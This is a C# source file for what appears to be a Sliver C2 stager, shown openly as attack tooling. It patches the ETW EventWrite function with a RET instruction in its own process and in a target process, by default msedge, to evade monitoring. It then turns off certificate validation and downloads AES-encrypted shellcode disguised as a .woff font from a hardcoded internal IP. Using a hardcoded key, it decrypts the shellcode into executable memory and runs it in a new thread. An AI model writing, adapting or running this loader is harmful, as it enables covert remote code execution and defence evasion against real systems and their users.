using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Xml.Linq;

namespace Sliver_stager
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t";
        private static string AESIV = "8y/B?E(G+KbPeShV";
        private static string url = "http://192.168.1.131:8000/test.woff";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        public static void DownloadAndExecute()
        {
            Console.WriteLine("Starting DownloadAndExecute...");
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);
            Console.WriteLine("Shellcode downloaded.");

            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length - 1; i++)
            {
                l.Add(shellcode[i]);
            }
            Console.WriteLine("Shellcode adjusted.");

            byte[] actual = l.ToArray();

            byte[] decrypted;

            decrypted = Decrypt(actual, AESKey, AESIV);
            Console.WriteLine("Shellcode decrypted.");
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);
            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
            Console.WriteLine("Shellcode allocated and copied to memory.");
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            Console.WriteLine("Shellcode executed.");
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        Console.WriteLine("Decryption in progress...");
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        private static int GetProcId(string[] args)
        {
            if (args.Length == 0)
            {
                args = new string[] { "msedge" };
            }

            if (args[0].All(char.IsDigit))
            {
                Console.WriteLine("Getting PID for target process ({0})...", args[0]);
                var pid = int.Parse(args[0]);
                var process = Process.GetProcessById(pid);
                Console.WriteLine("PID for target process: {0}", process.Id);
                return process.Id;
            }
            else
            {
                Console.WriteLine("Getting PID for target process ({0})...", args[0]);
                var name = args[0];
                var process = Process.GetProcessesByName(name).FirstOrDefault();
                Console.WriteLine("PID for target process ({0}): {1}", name, process.Id);
                return process.Id;
            }
        }

        private static IntPtr GetRemoteNtdllBaseAddress(Process targetProcess)
        {
            Console.WriteLine("Getting NTDLL base address for target process...");
            var ntdllBaseAddress = targetProcess.Modules.Cast<ProcessModule>().FirstOrDefault(m => m.ModuleName == "ntdll.dll")?.BaseAddress;

            if (ntdllBaseAddress.HasValue)
            {
                Console.WriteLine("NTDLL base address: 0x{0}", ntdllBaseAddress.Value.ToString("X"));
                return ntdllBaseAddress.Value;
            }
            else
            {
                throw new InvalidOperationException("Failed to get NTDLL base address.");
            }
        }

        private static IntPtr GetEtwEventWriteOffset()
        {
            Console.WriteLine("Getting ETW Event Write offset...");
            var localNtdllAddress = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
            var localNtdllBaseAddress = GetRemoteNtdllBaseAddress(Process.GetCurrentProcess());
            var offset = (long)localNtdllAddress - (long)localNtdllBaseAddress;

            Console.WriteLine("ETW Event Write offset: 0x{0}", offset.ToString("X"));
            return (IntPtr)offset;
        }

        private static void ModifyRemoteMemory(IntPtr processHandle, IntPtr address, byte newValue)
        {
            Console.WriteLine("Modifying remote memory...");
            const int PAGE_EXECUTE_READWRITE = 0x40;

            if (!VirtualProtectEx(processHandle, address, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out var oldProtect))
            {
                throw new InvalidOperationException("Failed to change memory protection.");
            }

            if (!WriteProcessMemory(processHandle, address, new[] { newValue }, 1, out _))
            {
                throw new InvalidOperationException("Failed to write to the memory.");
            }

            if (!VirtualProtectEx(processHandle, address, (UIntPtr)1, oldProtect, out _))
            {
                throw new InvalidOperationException("Failed to restore memory protection.");
            }
            Console.WriteLine("Remote memory modified.");
        }

        private static void PatchEtw(IntPtr processHandle, IntPtr remoteNtdllBaseAddress)
        {
            Console.WriteLine("Patching ETW...");
            IntPtr etwEventWriteOffset = GetEtwEventWriteOffset();
            IntPtr remoteEtwEventWriteAddress = (IntPtr)((long)remoteNtdllBaseAddress + (long)etwEventWriteOffset);

            byte newValue = 0xC3; // RET
            ModifyRemoteMemory(processHandle, remoteEtwEventWriteAddress, newValue);
            Console.WriteLine("ETW patched.");
        }

        public static IntPtr GetLibraryAddress(string dllName, string functionName)
        {
            Console.WriteLine("Getting address of {0} from {1}...", functionName, dllName);
            IntPtr hModule = LoadLibrary(dllName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException($"Unable to load library: {dllName}");
            }
            IntPtr functionAddress = GetProcAddress(hModule, functionName);
            if (functionAddress == IntPtr.Zero)
            {
                throw new EntryPointNotFoundException($"Unable to find function: {functionName}");
            }
            Console.WriteLine("Address of {0} from {1} obtained: 0x{2}", functionName, dllName, functionAddress.ToString("X"));
            return functionAddress;
        }

        public static void Main(string[] args)
        {
            // Begin ETW patching process
            Console.WriteLine("[*] ----- Patching ETW ----- [*]");
            int targetProcessId = GetProcId(args);
            Process targetProcess = Process.GetProcessById(targetProcessId);
            IntPtr targetProcessHandle = targetProcess.Handle;

            // Load the functions from kernel32.dll
            IntPtr vpeAddress = GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
            IntPtr wpmAddress = GetLibraryAddress("kernel32.dll", "WriteProcessMemory");

            var VirtualProtectEx = (VirtualProtectExDelegate)Marshal.GetDelegateForFunctionPointer(vpeAddress, typeof(VirtualProtectExDelegate));
            var WriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(wpmAddress, typeof(WriteProcessMemoryDelegate));

            // Patch the ETW
            IntPtr currentNtdllBaseAddress = GetRemoteNtdllBaseAddress(Process.GetCurrentProcess());
            PatchEtw(Process.GetCurrentProcess().Handle, currentNtdllBaseAddress);
            IntPtr remoteNtdllBaseAddress = GetRemoteNtdllBaseAddress(targetProcess);
            PatchEtw(targetProcessHandle, remoteNtdllBaseAddress);

            Console.WriteLine("[*] ETW patching complete.");

            // Download and execute the shellcode
            Console.WriteLine("[*] ----- Starting Download and Execute Process ----- [*]");

            // Enter to execute the shellcode
            Console.WriteLine("Press Enter to execute the shellcode...");
            Console.ReadLine();

            DownloadAndExecute();
        }

        private delegate bool VirtualProtectExDelegate(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    }
}
